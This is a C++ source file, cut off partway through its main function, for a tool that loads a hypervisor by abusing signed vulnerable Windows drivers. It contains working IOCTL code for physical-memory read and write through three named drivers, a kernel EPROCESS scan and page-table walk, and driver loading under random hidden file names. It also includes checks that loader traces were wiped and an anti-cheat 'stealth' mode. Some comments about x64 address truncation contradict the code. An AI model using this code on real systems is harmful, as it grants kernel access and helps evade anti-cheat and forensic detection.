/*
 * OphionLoad.cpp — BYOVD bring-up for Ophion hypervisor
 *
 * Supported vulnerable driver backends (--driver <name>):
 *   directio  — DirectIo64_legacy.sys  (PassMark) — original backend
 *   pstrip64  — pstrip64.sys (CVE-2026-29923, EnTech Taiwan PowerStrip ≤3.90.736)
 *               ZwMapViewOfSection(\Device\PhysicalMemory) via IOCTL 0x80002008
 *               Device: \\.\PSTRIP64 — zero security descriptor, any integrity level
 *   lnvmsrio  — LnvMSRIO.sys (CVE-2025-8061, Lenovo Dispatcher ≤3.1)
 *               MmMapIoSpace via IOCTLs 0x9C406104 (read) / 0x9C40A108 (write)
 *               Device: \\.\WinMsrDev
 *
 * The payload path is NtLoadDriver only.  No physical/manual payload mapper
 * is implemented here.  The x64 build rejects pstrip64 because that IOCTL
 * truncates its mapped user VA to 32 bits.
 *
 * DirectIo and LnvMSRIO expose physical access; the CR3 walker is retained
 * for diagnostic translation and primitive verification.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <winioctl.h>

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <random>
#include <stdexcept>
#include <string>
#include <vector>
#include <functional>
#include <memory>


#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ============================================================
// NT types & prototypes
// ============================================================
namespace {

using NtLoadDriverFn        = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using NtUnloadDriverFn      = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using RtlAdjustPrivilegeFn  = NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using RtlInitUnicodeStringFn= VOID(NTAPI*)(PUNICODE_STRING, PCWSTR);

NtLoadDriverFn          NtLoadDriverPtr         = nullptr;
NtUnloadDriverFn        NtUnloadDriverPtr       = nullptr;
RtlAdjustPrivilegeFn    RtlAdjustPrivilegePtr   = nullptr;
RtlInitUnicodeStringFn  RtlInitUnicodeStringPtr = nullptr;

constexpr ULONG kSeLoadDriverPrivilege = 10;

// ============================================================
// DirectIo64_legacy backend (original)
// ============================================================
constexpr DWORD kDirectIoMap   = 0x8011E044u;
constexpr DWORD kDirectIoUnmap = 0x8011E048u;

#pragma pack(push, 1)
struct DirectIoPhysMem {
    HANDLE   section;
    PVOID    ioSpace;
    PVOID    mdl;
    ULONG    size;
    ULONGLONG physical;
    PVOID    mapped;
    UCHAR    write;
};
#pragma pack(pop)
static_assert(sizeof(DirectIoPhysMem) == 0x2D, "DIRECTIO_PHYS_MEM");

// ============================================================
// pstrip64 backend (CVE-2026-29923)
// ZwMapViewOfSection(\Device\PhysicalMemory) — IOCTL 0x80002008
// Returns the mapped VA in SystemBuffer->LowPart (32-bit truncation).
// We compile x64 and work around the truncation by treating the returned
// 32-bit offset as a page-aligned user mapping that we can directly
// dereference — the kernel writes the low 32 bits of the kernel VA of the
// section mapping into our output buffer's LowPart field, and since the
// section is mapped into our process at an address within the low 4 GB
// (ZwMapViewOfSection sets the user VA), the cast is valid.
// ============================================================
constexpr DWORD kPstripIoctl = 0x80002008u;

#pragma pack(push, 1)
struct PstripMapRequest {
    ULONG LowPart;   // [in] low 32 bits of physical address (page-aligned)
    ULONG HighPart;  // [in] high 32 bits
    ULONG Length;    // [in] bytes to map (page multiple)
    ULONG Reserved;  // padding
    // [out] LowPart receives the mapped user VA (low 32 bits)
};
#pragma pack(pop)

// ============================================================
// LnvMSRIO backend (CVE-2025-8061)
// MmMapIoSpace — separate read/write IOCTLs
// ============================================================
constexpr DWORD kLnvReadIoctl  = 0x9C406104u;
constexpr DWORD kLnvWriteIoctl = 0x9C40A108u;

// Input for read: 16 bytes
#pragma pack(push, 1)
struct LnvReadRequest {
    UINT64 PhysicalAddress;
    UINT32 AccessSize;  // 1=byte 2=word 4=dword 8=qword
    UINT32 Count;
};
// Input for write: 16 bytes header + Count*AccessSize bytes data
struct LnvWriteRequest {
    UINT64 PhysicalAddress;
    UINT32 AccessSize;
    UINT32 Count;
    // data follows inline — allocate with extra bytes
};
#pragma pack(pop)

// ============================================================
// Abstract phys R/W interface — implemented per backend
// ============================================================
struct PhysBackend {
    virtual ~PhysBackend() = default;

    // Map size bytes at physical address pa into our VA space.
    // Returns nullptr on failure.  The mapping is valid until Unmap is called.
    virtual PVOID Map(ULONGLONG pa, ULONG size) = 0;
    virtual void  Unmap(PVOID va, ULONG size)   = 0;

    // Convenience: read/write arbitrary byte ranges.  Backends with copy
    // buffers override these so a read-only Unmap can never write RAM.
    virtual bool Read(ULONGLONG pa, void* buf, ULONG size);
    virtual bool Write(ULONGLONG pa, const void* buf, ULONG size);

    // Name for logging
    virtual const char* Name() const = 0;
};

bool PhysBackend::Read(ULONGLONG pa, void* buf, ULONG size) {
    ULONGLONG page    = pa & ~(ULONGLONG)0xFFF;
    ULONG     offset  = (ULONG)(pa - page);
    ULONG     mapsize = (offset + size + 0xFFF) & ~0xFFFu;
    PVOID     va      = Map(page, mapsize);
    if (!va) return false;
    memcpy(buf, reinterpret_cast<PUCHAR>(va) + offset, size);
    Unmap(va, mapsize);
    return true;
}
bool PhysBackend::Write(ULONGLONG pa, const void* buf, ULONG size) {
    ULONGLONG page    = pa & ~(ULONGLONG)0xFFF;
    ULONG     offset  = (ULONG)(pa - page);
    ULONG     mapsize = (offset + size + 0xFFF) & ~0xFFFu;
    PVOID     va      = Map(page, mapsize);
    if (!va) return false;
    memcpy(reinterpret_cast<PUCHAR>(va) + offset, buf, size);
    Unmap(va, mapsize);
    return true;
}

struct DirectIoBackend : PhysBackend {
    HANDLE device;
    std::vector<DirectIoPhysMem> maps;

    explicit DirectIoBackend(HANDLE h) : device(h) {}
    const char* Name() const override { return "directio"; }

    PVOID Map(ULONGLONG pa, ULONG size) override {
        DirectIoPhysMem io{};
        io.size     = size;
        io.physical = pa;
        io.write    = 1;
        DWORD ret = 0;
        if (!DeviceIoControl(device, kDirectIoMap,
                             &io, sizeof(io), &io, sizeof(io), &ret, nullptr) ||
            !io.mapped)
            return nullptr;
        maps.push_back(io);
        return io.mapped;
    }
    void Unmap(PVOID va, ULONG) override {
        auto it = std::find_if(maps.begin(), maps.end(),
            [va](const DirectIoPhysMem& io){ return io.mapped == va; });
        if (it == maps.end())
            return;
        DWORD ret = 0;
        (void)DeviceIoControl(device, kDirectIoUnmap,
                              &*it, sizeof(*it), &*it, sizeof(*it),
                              &ret, nullptr);
        maps.erase(it);
    }
};

// ============================================================
// pstrip64 backend
// ZwMapViewOfSection into our process address space.
// The mapping persists until UnmapViewOfFile / ZwUnmapViewOfSection.
// We track each mapping in a small vector so Unmap can call UnmapViewOfFile.
// ============================================================
struct PstripBackend : PhysBackend {
    HANDLE device;
    // Each map call records [user_va -> size] so Unmap works
    struct MapRecord { PVOID va; ULONG size; };
    std::vector<MapRecord> maps;

    explicit PstripBackend(HANDLE h) : device(h) {}
    const char* Name() const override { return "pstrip64"; }

    PVOID Map(ULONGLONG pa, ULONG size) override {
        // pa must be page-aligned; size page-multiple
        PstripMapRequest req{};
        req.LowPart  = static_cast<ULONG>(pa & 0xFFFFFFFFull);
        req.HighPart = static_cast<ULONG>(pa >> 32);
        req.Length   = size;

        PstripMapRequest out{};
        DWORD ret = 0;
        if (!DeviceIoControl(device, kPstripIoctl,
                             &req, sizeof(req), &out, sizeof(out), &ret, nullptr))
            return nullptr;

        // Driver returns the low 32-bit value of the mapped user VA in LowPart.
        // Section is mapped into our process; since Windows maps user sections
        // below 0x80000000 on 64-bit, the high dword is 0.
        if (!out.LowPart)
            return nullptr;

        PVOID va = reinterpret_cast<PVOID>(static_cast<uintptr_t>(out.LowPart));
        maps.push_back({va, size});
        return va;
    }

    void Unmap(PVOID va, ULONG /*size*/) override {
        // Unmap the section view — ZwUnmapViewOfSection or UnmapViewOfFile both work.
        UnmapViewOfFile(va);
        maps.erase(std::remove_if(maps.begin(), maps.end(),
            [va](const MapRecord& r){ return r.va == va; }), maps.end());
    }

    ~PstripBackend() override {
        for (auto& m : maps)
            UnmapViewOfFile(m.va);
    }
};

// ============================================================
// LnvMSRIO backend
// Uses MmMapIoSpace in the driver — read/write IOCTLs.
// For this backend we allocate a local buffer for read, write whole pages.
// ============================================================
struct LnvMsrioBackend : PhysBackend {
    HANDLE device;
    // We keep a shadow VA buffer per Map call so we can present a contiguous VA.
    // VirtualAlloc is the easiest; data is copied in from physical by issuing
    // read IOCTLs 8 bytes at a time.
    struct MapRecord { PVOID va; ULONG size; ULONGLONG pa; };
    std::vector<MapRecord> maps;

    explicit LnvMsrioBackend(HANDLE h) : device(h) {}
    const char* Name() const override { return "lnvmsrio"; }

    bool PhysRead8(ULONGLONG pa, UINT64& out) {
        LnvReadRequest req{};
        req.PhysicalAddress = pa;
        req.AccessSize      = 8;
        req.Count           = 1;
        UINT64 result = 0;
        DWORD  ret    = 0;
        if (DeviceIoControl(device, kLnvReadIoctl,
                            &req, sizeof(req), &result, sizeof(result),
                            &ret, nullptr) && ret == 8) {
            out = result;
            return true;
        }
        return false;
    }

    bool PhysWrite8(ULONGLONG pa, UINT64 val) {
        std::vector<BYTE> buf(sizeof(LnvWriteRequest) + sizeof(UINT64));
        auto* hdr = reinterpret_cast<LnvWriteRequest*>(buf.data());
        hdr->PhysicalAddress = pa;
        hdr->AccessSize      = 8;
        hdr->Count           = 1;
        memcpy(buf.data() + sizeof(LnvWriteRequest), &val, 8);
        DWORD ret = 0;
        return DeviceIoControl(device, kLnvWriteIoctl,
                               buf.data(), static_cast<DWORD>(buf.size()),
                               nullptr, 0, &ret, nullptr) != 0;
    }

    bool Read(ULONGLONG pa, void* out, ULONG size) override {
        auto* dst = reinterpret_cast<BYTE*>(out);
        ULONG done = 0;
        while (done < size) {
            if (((pa + done) & 7) == 0 && size - done >= 8) {
                UINT64 value = 0;
                if (!PhysRead8(pa + done, value)) return false;
                memcpy(dst + done, &value, 8);
                done += 8;
            } else {
                LnvReadRequest req{};
                req.PhysicalAddress = pa + done;
                req.AccessSize = 1;
                req.Count = 1;
                DWORD ret = 0;
                if (!DeviceIoControl(device, kLnvReadIoctl,
                                     &req, sizeof(req), dst + done, 1,
                                     &ret, nullptr) || ret != 1)
                    return false;
                done++;
            }
        }
        return true;
    }

    bool Write(ULONGLONG pa, const void* in, ULONG size) override {
        const auto* src = reinterpret_cast<const BYTE*>(in);
        ULONG done = 0;
        while (done < size) {
            if (((pa + done) & 7) == 0 && size - done >= 8) {
                UINT64 value = 0;
                memcpy(&value, src + done, 8);
                if (!PhysWrite8(pa + done, value)) return false;
                done += 8;
            } else {
                std::vector<BYTE> packet(sizeof(LnvWriteRequest) + 1);
                auto* req = reinterpret_cast<LnvWriteRequest*>(packet.data());
                req->PhysicalAddress = pa + done;
                req->AccessSize = 1;
                req->Count = 1;
                packet[sizeof(LnvWriteRequest)] = src[done];
                DWORD ret = 0;
                if (!DeviceIoControl(device, kLnvWriteIoctl,
                                     packet.data(), (DWORD)packet.size(),
                                     nullptr, 0, &ret, nullptr))
                    return false;
                done++;
            }
        }
        return true;
    }


    PVOID Map(ULONGLONG pa, ULONG size) override {
        PVOID va = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!va) return nullptr;

        // Fill shadow buffer by reading 8 bytes at a time
        ULONG done = 0;
        while (done + 8 <= size) {
            UINT64 qw = 0;
            if (!PhysRead8(pa + done, qw)) {
                VirtualFree(va, 0, MEM_RELEASE);
                return nullptr;
            }
            memcpy(reinterpret_cast<PUCHAR>(va) + done, &qw, 8);
            done += 8;
        }
        // Handle tail (< 8 bytes) via byte reads
        while (done < size) {
            LnvReadRequest req{};
            req.PhysicalAddress = pa + done;
            req.AccessSize      = 1;
            req.Count           = 1;
            BYTE b   = 0;
            DWORD ret = 0;
            if (!DeviceIoControl(device, kLnvReadIoctl,
                                 &req, sizeof(req), &b, 1, &ret, nullptr)) {
                VirtualFree(va, 0, MEM_RELEASE);
                return nullptr;
            }
            reinterpret_cast<PUCHAR>(va)[done++] = b;
        }

        maps.push_back({va, size, pa});
        return va;
    }

    void Unmap(PVOID va, ULONG) override {
        VirtualFree(va, 0, MEM_RELEASE);
        maps.erase(std::remove_if(maps.begin(), maps.end(),
            [va](const MapRecord& r){ return r.va == va; }), maps.end());
    }

    ~LnvMsrioBackend() override {
        for (auto& m : maps)
            VirtualFree(m.va, 0, MEM_RELEASE);
    }
};

// ============================================================
// CR3 page-table walker
// Walks PML4 → PDPT → PD → PT using the physical R/W primitive
// to convert a guest kernel virtual address to physical address.
// ============================================================
struct Cr3Walker {
    PhysBackend* phys;

    UINT64 VirtToPhys(UINT64 cr3, UINT64 va) const {
        auto readPte = [&](UINT64 pa) -> UINT64 {
            UINT64 val = 0;
            phys->Read(pa, &val, 8);
            return val;
        };

        UINT64 pml4e = readPte((cr3 & ~0xFFFull) + ((va >> 39) & 0x1FF) * 8);
        if (!(pml4e & 1)) return 0;

        UINT64 pdpte = readPte((pml4e & ~0xFFFull) + ((va >> 30) & 0x1FF) * 8);
        if (!(pdpte & 1)) return 0;
        if (pdpte & (1ULL << 7)) // 1 GB page
            return (pdpte & ~0x3FFFFFFFull) | (va & 0x3FFFFFFFull);

        UINT64 pde = readPte((pdpte & ~0xFFFull) + ((va >> 21) & 0x1FF) * 8);
        if (!(pde & 1)) return 0;
        if (pde & (1ULL << 7)) // 2 MB page
            return (pde & ~0x1FFFFFull) | (va & 0x1FFFFFull);

        UINT64 pte = readPte((pde & ~0xFFFull) + ((va >> 12) & 0x1FF) * 8);
        if (!(pte & 1)) return 0;
        return (pte & ~0xFFFull) | (va & 0xFFFull);
    }

    // Walk EPROCESS ActiveProcessLinks to find CR3 for a given PID.
    // Uses SystemInformationClass 11 (SystemModuleInformation) to get
    // ntoskrnl base, then scans for PsInitialSystemProcess pattern to
    // locate the System EPROCESS, and walks the ActiveProcessLinks list.
    //
    // Offsets for Windows 10/11 x64:
    static constexpr UINT64 kOffDirectoryTableBase = 0x028;
    static constexpr UINT64 kOffActiveProcessLinks = 0x448;
    static constexpr UINT64 kOffUniqueProcessId    = 0x440;

    // Find EPROCESS for a PID by scanning physical memory for pool tag 'Proc'
    // and validating the structure heuristically.
    UINT64 FindEprocByPid(DWORD targetPid, UINT64 physMax) const {
        // Scan physical memory in 2 MB chunks looking for pool tag 'Proc'
        constexpr ULONG kChunk   = 0x200000; // 2 MB
        constexpr ULONG kStep    = 16;       // _POOL_HEADER granularity
        constexpr UINT32 kProcTag = 0x636F7250u; // 'Proc'

        for (UINT64 base = 0x10000000; base < physMax; base += kChunk) {
            std::vector<BYTE> chunk(kChunk, 0);
            if (!phys->Read(base, chunk.data(), kChunk))
                continue;

            for (ULONG off = 0; off + 0x100 < kChunk; off += kStep) {
                if (*reinterpret_cast<UINT32*>(chunk.data() + off) != kProcTag)
                    continue;

                // Try both pool header offsets (0x40 for System, 0x80 for others)
                for (ULONG hdrOff : {0x40u, 0x80u}) {
                    if (off < hdrOff) continue;
                    UINT64 eprocBase = base + off - hdrOff;

                    // Validate PriorityClass == 2
                    BYTE prio = 0;
                    if (!phys->Read(eprocBase + 0x4B0, &prio, 1)) continue;
                    if (prio != 2) continue;

                    // Validate first char of ImageFileName is printable ASCII
                    BYTE fnc = 0;
                    if (!phys->Read(eprocBase + 0x5A8, &fnc, 1)) continue;
                    if (fnc < 0x20 || fnc > 0x7E) continue;

                    // Read UniqueProcessId
                    UINT64 pid = 0;
                    if (!phys->Read(eprocBase + kOffUniqueProcessId, &pid, 8)) continue;
                    if ((DWORD)pid == targetPid)
                        return eprocBase;
                }
            }
        }
        return 0;
    }

    // Get CR3 for a given PID via pool scan
    UINT64 GetCr3ForPid(DWORD pid, UINT64 physMax) const {
        UINT64 eproc = FindEprocByPid(pid, physMax);
        if (!eproc) return 0;
        UINT64 cr3 = 0;
        phys->Read(eproc + kOffDirectoryTableBase, &cr3, 8);
        return cr3 & ~0xFFFull;
    }
};


// ============================================================
// Heuristic trace scan
//
// These scans look for a timestamp or short UTF-16 name in a bounded
// physical range.  They do not locate PiDDBCacheTable/MmUnloadedDrivers
// structurally and therefore cannot prove that Windows loader state is
// clean.  They are retained only as diagnostics.
// ============================================================

// Verify PiDDBCache wipe from usermode by reading kernel memory.
// Scans physical RAM for the Ophion driver's TimeDateStamp in PiDDB tree nodes.
bool VerifyPiddbWiped(PhysBackend* phys, ULONG timeDateStamp, UINT64 physMax) {
    constexpr ULONG kChunk = 0x200000;
    std::vector<BYTE> chunk(kChunk, 0);
    for (UINT64 base = 0; base < physMax; base += kChunk) {
        if (!phys->Read(base, chunk.data(), kChunk)) continue;
        for (ULONG off = 0; off + 4 <= kChunk; off += 4) {
            if (*reinterpret_cast<ULONG*>(chunk.data() + off) == timeDateStamp) {
                std::fprintf(stderr,
                    "[!] PiDDBCache entry for TimeDateStamp=0x%08X found at PA=0x%llX "
                    "— tracewipe incomplete\n",
                    timeDateStamp, base + off);
                return false;
            }
        }
    }
    return true;
}

// Verify MmUnloadedDrivers is clean: scan for the driver name unicode chars.
bool VerifyUnloadedWiped(PhysBackend* phys, const wchar_t* driverName, UINT64 physMax) {
    // Build a byte pattern from the first 8 wchars
    size_t nameLen = wcslen(driverName);
    if (nameLen > 8) nameLen = 8;
    std::vector<BYTE> pat;
    for (size_t i = 0; i < nameLen; i++) {
        pat.push_back(static_cast<BYTE>(driverName[i] & 0xFF));
        pat.push_back(static_cast<BYTE>(driverName[i] >> 8));
    }

    constexpr ULONG kChunk = 0x200000;
    std::vector<BYTE> chunk(kChunk, 0);
    for (UINT64 base = 0; base < physMax; base += kChunk) {
        if (!phys->Read(base, chunk.data(), kChunk)) continue;
        for (ULONG off = 0; off + (ULONG)pat.size() <= kChunk; off++) {
            if (memcmp(chunk.data() + off, pat.data(), pat.size()) == 0) {
                std::fprintf(stderr,
                    "[!] Driver name found in MmUnloadedDrivers at PA=0x%llX "
                    "— tracewipe incomplete\n",
                    base + off);
                return false;
            }
        }
    }
    return true;
}

// ============================================================
// Helpers
// ============================================================
std::wstring randomStem() {
    static const wchar_t kChars[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::mt19937 rng(static_cast<unsigned>(__rdtsc()));
    std::uniform_int_distribution<int> dist(0, 35);
    std::wstring name(10, L'a');
    for (auto& ch : name) ch = kChars[dist(rng)];
    return name;
}

void resolveNt() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) throw std::runtime_error("ntdll missing");
#define RES(fn) fn##Ptr = reinterpret_cast<fn##Fn>(GetProcAddress(ntdll, #fn)); \
                if (!fn##Ptr) throw std::runtime_error(#fn " missing")
    RES(NtLoadDriver);
    RES(NtUnloadDriver);
    RES(RtlAdjustPrivilege);
    RES(RtlInitUnicodeString);
#undef RES
}

void enableLoadDriver() {
    BOOLEAN was = FALSE;
    NTSTATUS st = RtlAdjustPrivilegePtr(kSeLoadDriverPrivilege, TRUE, FALSE, &was);
    if (!NT_SUCCESS(st)) throw std::runtime_error("SeLoadDriverPrivilege denied");
}

std::wstring copyRandom(const std::wstring& src) {
    wchar_t temp[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, temp);
    std::wstring dest = std::wstring(temp) + randomStem() + L".sys";
    if (!CopyFileW(src.c_str(), dest.c_str(), FALSE))
        throw std::runtime_error("CopyFileW failed");
    SetFileAttributesW(dest.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
    MoveFileExW(dest.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    return dest;
}

static void markDeletePending(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    FILE_DISPOSITION_INFO info{};
    info.DeleteFile = TRUE;
    SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
    CloseHandle(h);
}

std::wstring serviceKey(const std::wstring& stem) {
    return L"SYSTEM\\CurrentControlSet\\Services\\" + stem;
}

void writeService(const std::wstring& stem, const std::wstring& imageNt) {
    HKEY  key  = nullptr;
    DWORD disp = 0;
    LSTATUS err = RegCreateKeyExW(HKEY_LOCAL_MACHINE, serviceKey(stem).c_str(),
                                  0, nullptr, REG_OPTION_NON_VOLATILE,
                                  KEY_WRITE, nullptr, &key, &disp);
    if (err != ERROR_SUCCESS) throw std::runtime_error("RegCreateKeyEx failed");
    DWORD type = 1, start = 3, error = 1;
    RegSetValueExW(key, L"Type",  0, REG_DWORD,
                   reinterpret_cast<BYTE*>(&type),  sizeof(type));
    RegSetValueExW(key, L"Start", 0, REG_DWORD,
                   reinterpret_cast<BYTE*>(&start), sizeof(start));
    RegSetValueExW(key, L"ErrorControl", 0, REG_DWORD,
                   reinterpret_cast<BYTE*>(&error), sizeof(error));
    RegSetValueExW(key, L"ImagePath", 0, REG_EXPAND_SZ,
                   reinterpret_cast<const BYTE*>(imageNt.c_str()),
                   static_cast<DWORD>((imageNt.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
}

void deleteService(const std::wstring& stem) {
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, serviceKey(stem).c_str());
}

NTSTATUS loadStem(const std::wstring& stem) {
    std::wstring path = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + stem;
    UNICODE_STRING u{};
    RtlInitUnicodeStringPtr(&u, path.c_str());
    return NtLoadDriverPtr(&u);
}

NTSTATUS unloadStem(const std::wstring& stem) {
    std::wstring path = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + stem;
    UNICODE_STRING u{};
    RtlInitUnicodeStringPtr(&u, path.c_str());
    return NtUnloadDriverPtr(&u);
}

// Open a device by DOS path (stem → \\.\stem or fixed name)
HANDLE openDevice(const std::wstring& dosPath) {
    HANDLE h = CreateFileW(dosPath.c_str(),
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        throw std::runtime_error("CreateFile device failed");
    return h;
}

// Probe the physical memory upper bound by reading the system memory map.
UINT64 probePhysMax() {
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    // Heuristic: use 4 GB for 32-bit scan (pstrip), 8 GB ceiling for 64-bit.
    // Real bound from MmGetPhysicalMemoryRanges is in kernel; we approximate.
    return 0x140000000ull; // 5 GB default
}

// Smoke-test: map 1 MB at PA 0x100000 and read a sample
int smoke(PhysBackend* phys) {
    BYTE buf[4] = {};
    if (!phys->Read(0x100000, buf, sizeof(buf))) {
        std::fprintf(stderr, "smoke: read PA 0x100000 failed\n");
        return 1;
    }
    UINT32 sample = buf[0] | (buf[1]<<8) | (buf[2]<<16) | (buf[3]<<24);
    std::printf("[+] %s smoke ok PA=0x100000 sample=0x%08X\n",
                phys->Name(), sample);
    return 0;
}

// CR3 walker demo: resolve current process CR3 and translate a test VA
int demoWalk(PhysBackend* phys) {
    UINT64 physMax = probePhysMax();
    Cr3Walker walker{phys};

    DWORD myPid = GetCurrentProcessId();
    std::printf("[*] Scanning physical memory for EPROCESS (PID=%lu)...\n", myPid);

    UINT64 cr3 = walker.GetCr3ForPid(myPid, physMax);
    if (!cr3) {
        std::fprintf(stderr, "[-] EPROCESS/CR3 for PID %lu not found\n", myPid);
        return 1;
    }
    std::printf("[+] Found CR3=0x%016llX for PID %lu\n", cr3, myPid);

    // Translate a known VA (our own stack frame)
    UINT64 testVa = reinterpret_cast<UINT64>(&physMax);
    UINT64 pa     = walker.VirtToPhys(cr3, testVa);
    std::printf("[+] VA=0x%016llX -> PA=0x%016llX\n", testVa, pa);

    // Verify: read our own variable back from physical memory
    if (pa) {
        UINT64 readback = 0;
        phys->Read(pa, &readback, sizeof(readback));
        std::printf("[+] Readback=0x%016llX (expected 0x%016llX) — %s\n",
                    readback, physMax,
                    readback == physMax ? "OK" : "MISMATCH");
    }
    return 0;
}

// Verify tracewipe completeness from usermode
int verifyTracewipe(PhysBackend* phys,
                    ULONG timeDateStamp,
                    const wchar_t* driverStemName) {
    UINT64 physMax = probePhysMax();
    std::printf("[*] Verifying PiDDBCache wipe (TimeDateStamp=0x%08X)...\n",
                timeDateStamp);
    bool piddbClean = VerifyPiddbWiped(phys, timeDateStamp, physMax);
    std::printf("[*] Verifying MmUnloadedDrivers wipe (%ls)...\n", driverStemName);
    bool unloadedClean = VerifyUnloadedWiped(phys, driverStemName, physMax);
    if (piddbClean && unloadedClean) {
        std::printf("[+] Tracewipe verified clean\n");
        return 0;
    }
    return 1;
}

void usage() {
    std::fputs(
        "OphionLoad — guarded BYOVD bring-up for Ophion\n"
        "\n"
        "usage:\n"
        "  OphionLoad.exe --driver <directio|lnvmsrio> --vuln <driver.sys> [options]\n"
        "  OphionLoad.exe --driver <backend> --existing --device <dos-path> [options]\n"
        "\n"
        "safe defaults:\n"
        "  - administrator-only Ophion control device\n"
        "  - no loader-list/cache wipe, live-driver conceal, stack rewriting,\n"
        "    kernel-global patch, firmware-table patch, or SMBIOS mutation\n"
        "  - copied driver is delete-pended only after NtLoadDriver succeeds\n"
        "\n"
        "options:\n"
        "  --vuln <path>          Signed vulnerable-driver path\n"
        "  --existing             Reuse an already-loaded backend; creates no file/service\n"
        "  --device <dos-path>    Required with --existing\n"
        "  --load-image <path>    Load diagnostic Ophion.sys with NtLoadDriver\n"
        "  --smoke                Read four bytes at PA 0x100000\n"
        "  --walk                 Demonstrate CR3 page-table translation\n"
        "  --eac-stealth          Query the non-destructive AC profile status\n"
        "  --verify-wipe <tds>    Heuristic physical scan only; not proof of PiDDB state\n"
        "  --conceal-byovd        Experimental and disabled in safe builds\n"
        "  --protect <va> <size>  Rejected: call ophion::harden_image in the target process\n"
        "  --help, -h\n"
        "\n"
        "example:\n"
        "  OphionLoad.exe --driver lnvmsrio --vuln LnvMSRIO.sys --smoke --walk\n"
        "                 --load-image Ophion.sys --eac-stealth\n",
        stderr);
}


} // namespace

int wmain(int argc, wchar_t** argv) {
    try {
        std::wstring driverBackend = L"directio";
        std::wstring vuln;
        std::wstring image;
        std::wstring deviceOverride;
        ULONG        verifyTds   = 0;
        bool         doSmoke     = false;
        bool         doWalk      = false;
        bool         doVerify    = false;
        bool         doConceal   = false;
        bool         doEacStealth= false;
        bool         existing    = false;
        uint64_t     protectVa   = 0;
        uint64_t     protectSize = 0;

        for (int i = 1; i < argc; i++) {
            std::wstring arg = argv[i];
            auto need = [&]() -> std::wstring {
                if (i + 1 >= argc) throw std::runtime_error("missing value");
                return argv[++i];
            };
            if      (arg == L"--driver")       driverBackend  = need();
            else if (arg == L"--vuln")         vuln           = need();
            else if (arg == L"--load-image")   image          = need();
            else if (arg == L"--device")       deviceOverride = need();
            else if (arg == L"--smoke")        doSmoke        = true;
            else if (arg == L"--walk")         doWalk         = true;
            else if (arg == L"--conceal-byovd") doConceal     = true;
            else if (arg == L"--eac-stealth")  doEacStealth   = true;
            else if (arg == L"--existing")     existing       = true;
            else if (arg == L"--protect") {
                protectVa   = std::wcstoull(need().c_str(), nullptr, 0);
                protectSize = std::wcstoull(need().c_str(), nullptr, 0);
            }
            else if (arg == L"--verify-wipe") {
                std::wstring tds = need();
                verifyTds = static_cast<ULONG>(std::wcstoull(tds.c_str(), nullptr, 0));
                doVerify  = true;
            }
            else if (arg == L"--help" || arg == L"-h") { usage(); return 0; }
            else throw std::runtime_error("unknown argument");
        }

        if (driverBackend != L"directio" &&
            driverBackend != L"lnvmsrio" &&
            driverBackend != L"pstrip64")
            throw std::runtime_error("unknown --driver backend");
#if defined(_WIN64)
        if (driverBackend == L"pstrip64")
            throw std::runtime_error(
                "pstrip64 returns a truncated 32-bit map VA; x64 use is disabled");
#endif
        if (protectVa || protectSize)
            throw std::runtime_error(
                "--protect must be issued from the target process via OphionInternal.h");

        if (vuln.empty() && !existing) { usage(); return 2; }
        if (existing && deviceOverride.empty())
            throw std::runtime_error("--existing requires --device");
        if (!image.empty()) {
            /* Safe defaults: non-destructive AC profile, no live-driver
               EPT conceal or loader-list unlinking. */
            doEacStealth = true;
        }

        resolveNt();
        if (!existing || !image.empty())
            enableLoadDriver();

        std::wstring vulnCopy;
        std::wstring vulnStem;
        if (!existing) {
            vulnCopy = copyRandom(vuln);
            vulnStem = vulnCopy.substr(vulnCopy.find_last_of(L"\\/") + 1);
            vulnStem = vulnStem.substr(0, vulnStem.find(L'.'));
            writeService(vulnStem, L"\\??\\" + vulnCopy);
            NTSTATUS st = loadStem(vulnStem);
            if (!NT_SUCCESS(st)) {
                deleteService(vulnStem);
                DeleteFileW(vulnCopy.c_str());
                std::fprintf(stderr,
                    "NtLoadDriver vuln 0x%08X (HVCI/blocklist?)\n",
                    static_cast<unsigned>(st));
                return 1;
            }
            markDeletePending(vulnCopy);
        }


        // -------------------------------------------------------------------
        // Open the device
        // -------------------------------------------------------------------
        std::wstring dosPath;
        if (!deviceOverride.empty()) {
            dosPath = deviceOverride;
        } else if (driverBackend == L"pstrip64") {
            dosPath = L"\\\\.\\PSTRIP64";
        } else if (driverBackend == L"lnvmsrio") {
            dosPath = L"\\\\.\\WinMsrDev";
        } else {
            // directio — device name is the random stem
            dosPath = L"\\\\.\\" + vulnStem;
        }

        HANDLE device = INVALID_HANDLE_VALUE;
        int rc = 0;

        auto cleanup = [&]() {
